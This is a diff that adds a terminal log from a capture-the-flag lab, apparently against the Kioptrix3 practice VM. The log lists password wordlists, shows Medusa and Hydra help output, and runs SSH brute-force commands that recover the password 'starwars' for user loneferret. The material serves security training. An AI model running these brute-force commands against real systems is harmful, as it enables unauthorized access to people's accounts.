@@ -1,0 +1,209 @@
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/Common-Credentials# dlist
+total 9384
+-rw-r--r-- 1 root root 8529110 Aug  8 01:24 10-million-password-list-top-1000000.txt
+-rw-r--r-- 1 root root     199 Aug  8 01:24 SplashData-2015-2.txt
+-rw-r--r-- 1 root root     200 Aug  8 01:24 SplashData-2015-1.txt
+-rw-r--r-- 1 root root     200 Aug  8 01:24 SplashData-2014.txt
+-rw-r--r-- 1 root root    7981 Aug  8 01:24 best1050.txt
+-rw-r--r-- 1 root root    3491 Aug  8 01:24 500-worst-passwords.txt
+-rw-r--r-- 1 root root   73017 Aug  8 01:24 10k-most-common.txt
+-rw-r--r-- 1 root root  851085 Aug  8 01:24 100k-most-used-passwords-NCSC.txt
+-rw-r--r-- 1 root root     849 Aug  8 01:24 best110.txt
+-rw-r--r-- 1 root root     194 Aug  8 01:24 top-passwords-shortlist.txt
+-rw-r--r-- 1 root root     173 Aug  8 01:24 top-20-common-SSH-passwords.txt
+-rw-r--r-- 1 root root    1290 Aug  8 01:24 medical-devices.txt
+-rw-r--r-- 1 root root   83641 Aug  8 01:24 four-digit-pin-codes-sorted-by-frequency-withcount.csv
+-rw-r--r-- 1 root root    5766 Aug  8 01:24 common-passwords-win.txt
+-rw-r--r-- 1 root root     110 Aug  8 01:24 best15.txt
+-rw-r--r-- 1 root root     742 Aug  8 01:24 worst-passwords-2017-top100-slashdata.txt
+drwxr-xr-x 2 root root    4096 Aug  9 00:11 .
+drwxr-xr-x 6 root root    4096 Aug  9 00:22 ..
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/Common-Credentials# cat 10-million-password-list-top-1000000.txt | grep starwars
+starwars
+starwars1
+starwars3
+starwars123
+starwars2
+starwars12
+starwars77
+starwars5
+starwars99
+starwars8
+starwars2000
+starwars7
+starwars69
+starwars6
+starwars4
+starwars1138
+deflep27-starwars
+starwarsstarwars
+starwarsjfkrush
+starwarsbcdfns
+starwars9
+starwars83
+starwars66
+starwars644
+starwars45
+starwars22
+starwars199
+starwars123456
+starwars11
+starwars101
+starwars01
+1starwars
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/Common-Credentials# medusa --help
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+medusa: invalid option -- '-'
+CRITICAL: Unknown error processing command-line options.
+ALERT: User logon information must be supplied.
+
+Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
+  -h [TEXT]    : Target hostname or IP address
+  -H [FILE]    : File containing target hostnames or IP addresses
+  -u [TEXT]    : Username to test
+  -U [FILE]    : File containing usernames to test
+  -p [TEXT]    : Password to test
+  -P [FILE]    : File containing passwords to test
+  -C [FILE]    : File containing combo entries. See README for more information.
+  -O [FILE]    : File to append log information to
+  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
+  -M [TEXT]    : Name of the module to execute (without the .mod extension)
+  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a
+                 different parameter each time and they will all be sent to the module (i.e.
+                 -m Param1 -m Param2, etc.)
+  -d           : Dump all known modules
+  -n [NUM]     : Use for non-default TCP port number
+  -s           : Enable SSL
+  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
+  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
+  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
+  -c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).
+  -t [NUM]     : Total number of logins to be tested concurrently
+  -T [NUM]     : Total number of hosts to be tested concurrently
+  -L           : Parallelize logins using one username per thread. The default is to process
+                 the entire username before proceeding.
+  -f           : Stop scanning host after first valid username/password found.
+  -F           : Stop audit after first valid username/password found on any host.
+  -b           : Suppress startup banner
+  -q           : Display module's usage information
+  -v [NUM]     : Verbose level [0 - 6 (more)]
+  -w [NUM]     : Error debug level [0 - 10 (more)]
+  -V           : Display version
+  -Z [TEXT]    : Resume scan based on map of previous scan
+
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/Common-Credentials# medusa -h Kioptrix3.com -u loneferret -P 10-million-password-list-top-1000000.txt -v 6 -M ssh
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+GENERAL: Parallel Hosts: 1 Parallel Logins: 1
+GENERAL: Total Hosts: 1
+GENERAL: Total Users: 1
+GENERAL: Total Passwords: 999999
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: 123456 (1 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: password (2 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: 12345678 (3 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: qwerty (4 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: 123456789 (5 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: 12345 (6 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: 1234 (7 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: 111111 (8 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: 1234567 (9 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: dragon (10 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: 123123 (11 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: baseball (12 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: abc123 (13 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: football (14 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: monkey (15 of 999999 complete)
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: letmein (16 of 999999 complete)
+^CALERT: Medusa received SIGINT - Sending notification to login threads that we are are aborting.
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: 696969 (17 of 999999 complete)
+ALERT: To resume scan, add the following to your original command: "-Z h1u1."
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/Common-Credentials# medusa -h Kioptrix3.com -u loneferret -p starwars -v 6 -M ssh
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+GENERAL: Parallel Hosts: 1 Parallel Logins: 1
+GENERAL: Total Hosts: 1
+GENERAL: Total Users: 1
+GENERAL: Total Passwords: 1
+ACCOUNT CHECK: [ssh] Host: Kioptrix3.com (1 of 1, 0 complete) User: loneferret (1 of 1, 0 complete) Password: starwars (1 of 1 complete)
+ACCOUNT FOUND: [ssh] Host: Kioptrix3.com User: loneferret Password: starwars [SUCCESS]
+GENERAL: Medusa has finished.
+
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/Common-Credentials# hydra -h
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
+
+Options:
+  -R        restore a previous aborted/crashed session
+  -I        ignore an existing restore file (don't wait 10 seconds)
+  -S        perform an SSL connect
+  -s PORT   if the service is on a different default port, define it here
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
+  -y        disable use of symbols in bruteforce, see above
+  -r		 rainy mode for password generation (-x)
+  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
+  -u        loop around users, not passwords (effective! implied with -x)
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -o FILE   write found login/password pairs to FILE instead of stdout
+  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
+  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
+  -c TIME   wait time per login attempt over all threads (enforces -t 1)
+  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
+  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
+  -O        use old SSL v2 and v3
+  -K        do not redo failed attempts (good for -M mass scanning)
+  -q        do not print messages about connection errors
+  -U        service module usage details
+  -m OPT    options specific for a module, see -U output for information
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+
+Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+
+Hydra is a tool to guess/crack valid login/password pairs.
+Licensed under AGPL v3.0. The newest version is always available at;
+https://github.com/vanhauser-thc/thc-hydra
+Please don't use in military or secret service organizations, or for illegal
+purposes. (This is a wish and non-binding - most such people do not care about
+laws and ethics anyway - and tell themselves they are one of the good ones.)
+These services were not compiled in: afp ncp oracle sapr3 smb2.
+
+Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
+E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
+     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
+     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
+     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
+
+Examples:
+  hydra -l user -P passlist.txt ftp://192.168.0.1
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  hydra -l admin -p password ftp://[192.168.0.0/24]/
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+
+root@Blue3:/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/Common-Credentials# hydra -l loneferret -P 10-million-password-list-top-1000000.txt ssh://Kioptrix3.com -t 16 -I
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-10 12:30:50
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 999999 login tries (l:1/p:999999), ~62500 tries per task
+[DATA] attacking ssh://Kioptrix3.com:22/
+[STATUS] 3730.00 tries/min, 3730 tries in 00:01h, 996302 to do in 04:28h, 16 active
+[STATUS] 1329.33 tries/min, 3988 tries in 00:03h, 996044 to do in 12:30h, 16 active
+[STATUS] 645.00 tries/min, 4515 tries in 00:07h, 995517 to do in 25:44h, 16 active
+...
+[22][ssh] host: Kioptrix3.com   login: loneferret   password: starwars
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-10 12:39:33
+
+=> OK
